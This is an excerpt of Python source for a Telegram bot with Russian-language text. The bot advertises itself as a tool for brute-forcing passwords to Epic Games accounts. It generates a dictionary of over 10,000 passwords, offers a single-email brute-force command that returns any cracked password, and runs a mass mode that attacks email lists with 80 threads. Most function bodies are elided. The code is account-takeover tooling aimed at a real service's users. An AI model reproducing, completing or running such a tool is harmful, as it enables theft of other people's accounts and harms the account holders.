...
PHOTO_FILE_ID = "ваш_file_id_здесь"  # вставьте ID фото

bot = telebot.TeleBot(BOT_TOKEN)

# ================== ГЕНЕРАЦИЯ РАСШИРЕННОГО СЛОВАРЯ (10 000+ паролей) ==================
BASE_WORDS = [
...
def cmd_start(message):
    ...
    bot.send_photo(
        ...
        caption=(
            ...
            "💪 Мощный инструмент для подбора паролей к аккаунтам Epic Games.\n\n"
            "📚 Словарь: <b>{}</b> паролей\n"
            "⚡ Скорость: многопоточный режим\n\n"
            "Выберите действие:"
...
def cmd_bruteforce(message):
    ...
    result = brute_single(email, timeout=30)
    if result:
        pwd, acc = result
        bot.reply_to(
            message,
...
def cmd_auto_mass(message):
    ...
    with ThreadPoolExecutor(max_workers=80) as executor:
        executor.map(check_worker, emails)
